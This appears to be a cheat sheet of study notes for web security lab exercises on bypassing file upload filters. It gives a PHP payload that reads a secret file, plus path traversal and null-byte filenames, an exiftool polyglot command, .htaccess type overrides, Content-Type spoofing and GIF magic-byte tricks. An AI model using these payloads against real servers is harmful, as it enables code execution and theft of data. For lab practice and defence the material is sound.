____
### Bypass Upload Controls  
  
>A vulnerable image upload function or avatar logo upload, can by exploited and security controls bypassed to upload content to extract sensitive data or execute code server side.  

>***Identify*** any type of file upload function.    

>The PHP `source code` of the exploit.php file below will read the `/home/carlos/secret` sensitive information.  

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```  

>File upload vulnerabilities bypass techniques:  
  
1. Upload the file name and include obfuscated path traversal `..%2fexploit.php` and retrieve the content `GET /files/avatars/..%2fexploit.php`.  
2. Upload a file named, `exploit.php%00.jpg` with trailing null byte character and get the file execution at `/files/avatars/exploit.php`.  
3. Create **polygot** using valid image file, by running the command in bash terminal: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./stickman.png -o polyglot2023.php`. Once polygot is uploaded, view the extracted data by issuing a GET request to the uploaded path `/files/avatars/polyglot.php` , and search the response content for the phrase `START` to obtain the sensitive data.  
4. Upload two different files. First upload `.htaccess` with Content-Type: `text/plain`, and the file data value set to `AddType application/x-httpd-php .l33t`. This will allow the upload and execute of second file upload named, `exploit.l33t` with extension `l33t`.  
5. MIME type `image/jpeg` or `image/png` is only allowed. Bypass the filter by specifying `Content-Type` to value of `image/jpeg` and then uploading `exploit.php` file.  
6. If target allow RFI, upload from remote URL, then host and exploit file with the following GIF magic bytes: `GIF89a; <?php echo file_get_contents('/home/carlos/secret'); ?>`. The file name on exploit server could read `image.php%00.gif`.
7. Double file extension bypass filter `exploit.csv.php`.  

Path traversal

filename="%2e%2e%2fshell.php"
